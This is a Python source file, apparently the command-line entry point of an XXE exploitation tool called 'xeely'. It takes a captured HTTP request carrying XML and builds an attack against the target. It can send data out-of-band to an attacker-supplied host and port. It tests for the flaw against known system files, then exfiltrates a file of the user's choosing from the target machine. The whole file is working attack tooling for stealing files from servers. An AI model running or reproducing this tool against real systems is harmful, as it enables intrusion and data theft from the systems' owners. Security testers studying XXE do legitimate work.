from pathlib import Path
from typing import Dict
from typing import Optional

import typer

from xeely import __app_name__
from xeely import __app_version__
from xeely import console
from xeely.custom_http import HTTPRequest
from xeely.custom_http.server import HTTPServerParams
from xeely.custom_xml import XML
from xeely.custom_xml.errors import XMLDataNotFound
from xeely.xxe.attacks import factory
from xeely.xxe.dictionary import FILES_TO_TEST
from xeely.xxe.strategy import XXEAttackStrategy

app = typer.Typer()


def _version_callback(value: bool) -> None:
    if value:
        typer.echo(f"{__app_name__} v{__app_version__}")
        raise typer.Exit()


@app.command()
def main(
    version: Optional[bool] = typer.Option(
        None,
        "--version",
        "-v",
        help="Show the application's version and exit.",
        callback=_version_callback,
        is_eager=True,
    ),
    request_io: typer.FileText = typer.Option(
        ..., "--request", "-r", help="Path to the request file containing XML data."
    ),
    file_path: Path = typer.Option(
        ..., "--file", "-f", help="The path to the file to exfiltrate from target machine."
    ),
    phpfilter: bool = typer.Option(
        False, help="Use PHP filter to base64 encode target file before sending."
    ),
    cdata: bool = typer.Option(
        False, help="Wrap the content of the file to exfiltrate in CDATA tags"
    ),
    lhost: Optional[str] = typer.Option(None, help="IP address to use for reverse connections."),
    lport: int = typer.Option(8000, help="Port to use for reverse connections."),
    https: bool = typer.Option(False, help="Use HTTPS to transmit requests instead of HTTP"),
    skip_testing: bool = typer.Option(
        False,
        "--skip-testing",
        "-st",
        help="Skip the phase to test whether or not the target"
        + "machine is vulnerable to XXE attacks.",
    ),
    strategy: XXEAttackStrategy = typer.Option(
        XXEAttackStrategy.BASIC.value,
        "--strategy",
        "-s",
        help="The strategy to use to exfiltrate data",
    ),
) -> None:
    # Parse HTTP request
    console.print_info("Parsing HTTP request")
    request_data = request_io.read()
    request = HTTPRequest.parse_request(request_data)

    target_url = request.get_url()
    target_url = target_url.replace("http", "https") if https else target_url

    http_server_params: Optional[HTTPServerParams] = None
    if lhost is not None:
        http_server_params = HTTPServerParams(lhost, lport)

    # Parsing XML
    console.print_info("Parsing XML content")
    xml = XML.parse_string(request.get_body())

    if xml is None:
        raise XMLDataNotFound()

    xxe_attack = factory.create_attack_instance_for_strategy(
        strategy.value,
        target_url=target_url,
        xml=xml,
        encode_data_with_base64=phpfilter,
        use_cdata_tag=cdata,
        http_server_params=http_server_params,
    )

    data_exfiltrated: Dict[str, str] = {}

    if not skip_testing:
        console.print_info("Testing if target machine is vulnerable to XXE attacks")
        testing_successful = False

        for test_file_path, matching_pattern in FILES_TO_TEST.items():
            console.print_info(f"Trying to exfiltrate the content of {file_path}")

            xxe_attack.set_use_cdata_tag(False)
            xxe_attack.set_encode_data_with_base64(strategy == XXEAttackStrategy.OOB)
            data = xxe_attack.exfiltrate_resource(Path(test_file_path))

            if matching_pattern in data:
                testing_successful = True
                data_exfiltrated[test_file_path] = data
                break

        if testing_successful:
            console.print_info("Target machine is vulnerable to XXE attacks", bold=True)
        else:
            console.print_warning("Target machine is not vulnerable to XXE attacks", bold=True)
            exit(0)

    if file_path in data_exfiltrated.keys():
        data = data_exfiltrated[str(file_path)]
    else:
        console.print_info(f"Exfiltrating the content of {file_path}")

        xxe_attack.set_use_cdata_tag(cdata)
        xxe_attack.set_encode_data_with_base64(phpfilter)
        data = xxe_attack.exfiltrate_resource(file_path)

    console.show_exfiltrated_data_in_table(resource_name=file_path, data=data)
